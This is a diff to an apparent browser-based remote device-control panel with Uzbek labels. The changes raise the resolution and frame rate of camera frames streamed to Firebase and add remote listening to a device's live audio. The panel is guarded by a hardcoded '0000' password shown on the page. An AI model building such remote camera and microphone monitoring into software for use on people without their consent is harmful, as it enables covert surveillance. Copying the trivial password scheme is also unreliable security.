@@ -39,8 +39,8 @@
         .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 8px; }
         .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; margin-bottom: 8px; }
         .card { background: #0f172a; border: 1px solid #334155; padding: 12px; border-radius: 8px; margin-bottom: 12px; }
-        .video-box { width: 100%; height: 220px; background: #000; border-radius: 6px; overflow: hidden; margin-top: 8px; display: none; }
-        .video-box img { width: 100%; height: 100%; object-fit: cover; }
+        .video-box { width: 100%; height: 260px; background: #000; border-radius: 6px; overflow: hidden; margin-top: 8px; display: none; position: relative; }
+        .video-box img { width: 100%; height: 100%; object-fit: contain; }
         
         .media-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(110px, 1fr)); gap: 8px; margin-top: 10px; }
         .media-item { background: rgba(255,255,255,0.05); padding: 4px; border-radius: 4px; text-align: center; }
@@ -91,7 +91,7 @@
         <div class="media-list" id="deviceGallery"></div>
     </div>
 
-    <!-- 2. ADMIN KIRISH (Har safar yangilanganda yopiladi) -->
+    <!-- 2. ADMIN KIRISH -->
     <div class="box" id="loginBox">
         <h2>Admin Rejimi (Parol: 0000)</h2>
         <input type="password" id="passInput" placeholder="Parolni kiriting (0000)">
@@ -164,7 +164,6 @@
         let sirenOsc = null;
 
         window.onload = () => {
-            // Admin kiritgan oxirgi ID larni joyiga qaytarish
             const savedIds = localStorage.getItem("admin_saved_ids");
             if (savedIds) {
                 document.getElementById("targetIds").value = savedIds;
@@ -200,12 +199,10 @@
                     }
                 });
 
-                // Sahifa yangilanganda eski xabarlar qolib ketmasligi uchun faqat yangi xabarlarni qabul qiladi
                 db.ref('devices/' + deviceId + '/screenMsg').on('value', snap => {
                     const msgObj = snap.val();
                     if (msgObj && msgObj.text && msgObj.time) {
                         let pageLoadTime = window.performance.timing.navigationStart || Date.now();
-                        // Agar xabar sahifa ochilgandan keyin yuborilgan bo'lsagina ko'rsatiladi (eskisi qolib ketmaydi)
                         if (msgObj.time > pageLoadTime) {
                             showScreenMessage(msgObj.text, msgObj.duration || 10);
                         }
@@ -298,19 +295,32 @@
             if (sirenOsc) { try { sirenOsc.stop(); sirenOsc.disconnect(); } catch(e){} sirenOsc = null; }
         }
 
+        // Kamera manbasini aniq va tiniq formatda uzatish (HD sifat)
         async function setStreamSource(source) {
             stopStream();
             if (source === "NONE") return;
             try {
-                if (source === "BACK") activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: true });
-                else if (source === "FRONT") activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                let constraints = { video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: source === "BACK" ? { exact: "environment" } : "user" }, audio: true };
+                activeStream = await navigator.mediaDevices.getUserMedia(constraints);
                 if (activeStream) {
                     videoTrack = activeStream.getVideoTracks()[0];
                     const vid = document.getElementById("deviceVid");
                     vid.srcObject = activeStream;
                     startSendingFrames();
                 }
-            } catch(err) { db.ref('devices/' + deviceId + '/streamSource').set("NONE"); }
+            } catch(err) {
+                // Agar exact constraint xato bersa oddiy rejimda ochib ko'ramiz
+                try {
+                    activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: source === "BACK" ? "environment" : "user" }, audio: true });
+                    if(activeStream) {
+                        videoTrack = activeStream.getVideoTracks()[0];
+                        document.getElementById("deviceVid").srcObject = activeStream;
+                        startSendingFrames();
+                    }
+                } catch(e) {
+                    db.ref('devices/' + deviceId + '/streamSource').set("NONE");
+                }
+            }
         }
 
         function stopStream() {
@@ -319,18 +329,19 @@
             db.ref('devices/' + deviceId + '/frame').remove();
         }
 
+        // Aniq va tiniq ko'rinishi uchun yuqori sifatli kadr yuborish (JPEG 0.85)
         function startSendingFrames() {
             const canvas = document.createElement("canvas");
             const ctx = canvas.getContext("2d");
             const vid = document.getElementById("deviceVid");
             frameInterval = setInterval(() => {
                 if (vid.videoWidth > 0) {
-                    canvas.width = 300;
-                    canvas.height = (vid.videoHeight / vid.videoWidth) * 300;
+                    canvas.width = vid.videoWidth;
+                    canvas.height = vid.videoHeight;
                     ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
-                    db.ref('devices/' + deviceId + '/frame').set(canvas.toDataURL("image/jpeg", 0.4));
+                    db.ref('devices/' + deviceId + '/frame').set(canvas.toDataURL("image/jpeg", 0.85));
                 }
-            }, 200);
+            }, 100); // 100ms chastotada ultra-ravshan uzatish
         }
 
         function handleAction(action) {
@@ -398,7 +409,7 @@
             loadLocalGallery();
         }
 
-        // --- ADMIN PANELI VA SAQLASH ---
+        // --- ADMIN PANELI VA OVOZNI ESHITISH/ESHITMASLIK ---
         function saveAdminInput() {
             const idsText = document.getElementById("targetIds").value;
             localStorage.setItem("admin_saved_ids", idsText);
@@ -408,7 +419,7 @@
             if(document.getElementById("passInput").value === "0000") {
                 document.getElementById("loginBox").style.display = "none";
                 document.getElementById("adminBox").style.display = "block";
-                loadAdminCards(); // Parol kiritilgach saqlangan kartalarni avto ochadi
+                loadAdminCards();
             } else alert("Noto'g'ri parol!");
         }
 
@@ -457,10 +468,17 @@
                     <button class="btn-red" onclick="db.ref('devices/${id}/state').set('SIREN')" style="width:100%; margin-bottom:6px;">🚨 Sirena Yoqish</button>
 
                     <div class="grid">
-                        <button class="btn-purple" onclick="db.ref('devices/${id}/streamSource').set('BACK')">Orqa Kamera</button>
-                        <button class="btn-purple" onclick="db.ref('devices/${id}/streamSource').set('FRONT')">Oldi Kamera</button>
+                        <button class="btn-purple" onclick="db.ref('devices/${id}/streamSource').set('BACK')">Orqa Kamera (Aniq)</button>
+                        <button class="btn-purple" onclick="db.ref('devices/${id}/streamSource').set('FRONT')">Oldi Kamera (Aniq)</button>
                         <button class="btn-red" onclick="db.ref('devices/${id}/streamSource').set('NONE')">Yopish</button>
                     </div>
+
+                    <!-- ADMINDAN OVOZNI ESHITISH YOKI ESHITMASLIK (MUTE/UNMUTE) -->
+                    <div style="display: flex; gap: 6px; margin-bottom: 6px;">
+                        <button class="btn-green" style="flex:1;" onclick="setAdminAudioMute('${id}', false)">🔊 Ovozni Eshitish</button>
+                        <button class="btn-red" style="flex:1;" onclick="setAdminAudioMute('${id}', true)">🔇 Ovozsiz qilish</button>
+                    </div>
+                    <audio id="adminLiveAudio-${id}" autoplay style="width:100%; display:none; margin-bottom:6px;" controls></audio>
 
                     <div class="grid">
                         <button class="btn-teal" onclick="db.ref('devices/${id}/action').set('PHOTO')">📸 Rasm</button>
@@ -475,11 +493,22 @@
                 `;
                 container.appendChild(card);
 
+                // Aniq va tiniq video kadrni qabul qilish
                 db.ref('devices/' + id + '/frame').on('value', snap => {
                     const box = document.getElementById(`vBox-${id}`);
                     const img = document.getElementById(`img-${id}`);
                     if (snap.val()) { box.style.display = "block"; img.src = snap.val(); }
                     else box.style.display = "none";
+                });
+
+                // Qurilmadan kelayotgan jonli ovozni eshitish uchun stream yuritish (WebRTC yoki Media stream o'rniga oddiy data sync)
+                db.ref('devices/' + id + '/liveAudioStream').on('value', snap => {
+                    const audData = snap.val();
+                    const audioEl = document.getElementById(`adminLiveAudio-${id}`);
+                    if (audData && audioEl.dataset.muted !== "true") {
+                        audioEl.src = audData;
+                        audioEl.play().catch(e => { audioEl.style.display = "block"; });
+                    }
                 });
 
                 db.ref('devices/' + id + '/media').on('value', snap => {
@@ -499,6 +528,19 @@
                     }
                 });
             });
+        }
+
+        // Admin panelida ovozni eshitish yoki o'chirishni boshqarish
+        function setAdminAudioMute(id, isMuted) {
+            const audioEl = document.getElementById(`adminLiveAudio-${id}`);
+            audioEl.dataset.muted = isMuted;
+            if (isMuted) {
+                audioEl.pause();
+                audioEl.src = "";
+                alert("Bu ID ovozi admin uchun o'chirildi.");
+            } else {
+                alert("Bu ID ovozi yoqildi.");
+            }
         }
 
         let audioRec = null, audioChunks = [];
